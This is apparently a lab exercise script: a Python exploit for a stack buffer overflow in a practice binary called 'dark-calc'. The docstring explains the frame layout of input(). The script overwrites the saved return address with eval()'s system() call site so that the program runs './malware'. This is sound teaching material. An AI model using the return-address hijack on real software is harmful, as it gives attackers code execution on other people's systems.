#!/usr/bin/env python3
"""Task 3 payload: run ./malware from attack/dark-calc through a stack overflow.

Frame layout of input() (see analysis/gdb/01_frame_and_main.txt):

    rbp-0x10  char expression[16]      <- gets() writes here, unbounded
    rbp+0x00  saved rbp                 <- 8 bytes
    rbp+0x08  saved return address      <- 8 bytes, the control-flow target

The overflow writes 24 bytes of padding and replaces the return address.
dark-calc runs on a 48-byte fixed stack window, so a three-qword
`pop rdi; ret` chain (48 bytes plus a NUL terminator) cannot fit.  Instead the
return address is aimed at eval()'s call site:

    0x401a6b  mov edi, 0x6030d0   ; command_buf, already holding "./malware"
    0x401a70  call system@plt

`input()` has just executed `strcpy(command_buf, expression)`, so command_buf
contains the first NUL-terminated part of this payload, i.e. "./malware".
The shell started by system() has dark-calc as an ancestor, which is exactly
what attack/malware checks with ps before printing the success banner.

Only the first 10 bytes of the buffer are the command string; everything after
the NUL is still written to the stack by gets() and forms the overflow.  The
fixed stack gives the buffer 48 writable bytes, so the 32-byte payload is well
inside the window.
"""
import struct
import sys

# eval()'s "mov edi, 0x6030d0; call system@plt" (objdump -d attack/dark-calc).
EVAL_SYSTEM_CALL = 0x401A6B

padding = b"./malware\x00" + b"A" * 6      # 16 bytes: command string + filler
saved_rbp = b"B" * 8                       # rbp is not used after leave; ret
payload = padding + saved_rbp + struct.pack("<Q", EVAL_SYSTEM_CALL)
payload += b"\n"                           # gets() consumes the delimiter

assert len(payload) <= 48, "gets() must stay below dark-calc's stack guard page"
assert b"\n" not in payload[:-1]
sys.stdout.buffer.write(payload)
